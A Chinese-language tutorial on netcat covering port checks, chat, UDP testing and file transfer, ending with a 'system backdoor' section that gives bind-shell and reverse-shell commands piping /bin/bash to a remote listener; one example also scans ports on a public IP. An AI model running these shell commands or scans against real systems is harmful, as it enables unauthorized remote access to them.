**前言**

netcat在网络工具中有瑞士军刀的美称，可以进行端口测试、传输测试、UDP会话、文件传输、网络吞吐量测试、系统后门。

## **端口测试**

这里主要对tcp端口是否启动进行测试。

目标主机 192.168.0.65

测试机 192.168.0.54

### 测试机执行命令示例1

```
nc \-vz  192.168.0.65  8090    
#v 显示一些信息   z代表不发送数据
```

![](../Images/f56708c65668a5b4e43abd1a69e27d44.png)

### 测试机执行命令示例2

```
nc \-vvw3z 192.168.0.65 80
#w3表示设置超时时间为3秒 两个v是为了显示更详细
```

![](../Images/7a29862c419e70095adf6f906c05cd4e.png)

### 扫描多个端口示例

```
nc \-vz  49.234.79.53 80\-9000
#这里我扫描了一个公网ip
```

![](../Images/9bc8e22a90f110f33af55079e220486e.png)

## 传输测试（聊天）

服务端使用nc开启监听，客户端进行连接，然后就可以通关nc进行信息同步，还是比较好玩的。

服务端 192.168.0.65   监听

```
 nc \-l 8888
\# -l 监听8888端口
```

客户端 192.168.0.54 请求

```
nc 192.168.0.65 8888
\# 向指定IP的8888端口发起连接
```

![](../Images/073f2eeebb23696bdca0d23d6719e74e.png)

## 测试UDP会话

这里主要用于网络测试，当你不确定两天机器能否进行udp数据传输时，可以使用nc来进行测试，这里和tcp数据传入差不多，可以进行信息发送，能够互相看到说明可以进行udp数据传输。

主机A开启监听udp8888端口

```
nc \-ul 8888
```

主机B连接主机A

```
nc \-u 192.168.0.54 8888
```

![](../Images/910a0b6ab38a2b6aa587368a67082481.png)

## 文件传输

从A主机向B主机传输一个文件，怎么传？很多人会想到各种文件服务，其实nc也可以干这件事。

接收文件主机A 192.168.0.65

```
nc -l 8888 > 1.php
```

传文件主机 192.168.0.54

```
nc 192.168.0.65 8888 < ma.php
```

![](../Images/d7521ffc30961932134c2f5e2ef109d9.png)

## 系统后门——nc反弹shell

### 正向反弹shell

目标主机 192.168.0.65

```
nc \-lvp 8888 \-e /bin/bash
\# -e 重定向 一旦连接就执行
```

获取shell主机 192.168.0.54

```
nc 192.168.0.65 8888
```

![](../Images/72b8d4db135506555bc998bb43aab3b7.png)

### 反向反弹shell

反向反弹shell是指攻击主机进行端口监听，被攻击主机进行后门连接。

获取shell主机 （这里kali失败课，使用了一台公网的centos测试）

```
nc \-l 8888
```

目标主机 192.168.0.65

```
nc \-e /bin/bash 接收shell主机的IP 8888
```
